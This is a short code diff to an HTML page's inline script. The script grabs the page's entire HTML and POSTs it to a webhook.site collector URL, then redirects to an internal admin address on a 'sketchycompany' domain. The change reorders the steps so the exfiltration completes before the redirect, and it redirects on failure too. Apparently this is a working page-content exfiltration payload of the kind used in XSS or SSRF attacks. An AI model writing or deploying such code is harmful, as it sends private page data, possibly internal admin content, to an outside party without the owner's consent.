@@ -12,10 +12,10 @@
 </html>
 
 <script>
-    document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
-    const htmlContent = document.documentElement.outerHTML;
+// 1. First, capture the HTML content of the current page
+const htmlContent = document.documentElement.outerHTML;
 
-// Send it to your webhook via POST
+// 2. Send the captured data to your webhook
 fetch('https://webhook.site/f6db471c-032a-4816-9df7-7e77adf14368', {
   method: 'POST',
   headers: {
@@ -27,12 +27,15 @@ fetch('https://webhook.site/f6db471c-032a-4816-9df7-7e77adf14368', {
   })
 })
 .then(response => {
-  console.log('Webhook sent successfully');
-  // Optional: proceed with redirect after posting
-  // window.location.href = 'https://destination-site.com';
+  console.log('Webhook sent successfully. Redirecting now...');
+  // 3. Only redirect AFTER the webhook confirms receipt
+  document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
 })
 .catch(error => {
   console.error('Error posting to webhook:', error);
+  // Optional: Redirect anyway if the webhook fails
+  document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
 });
+
     
 </script>
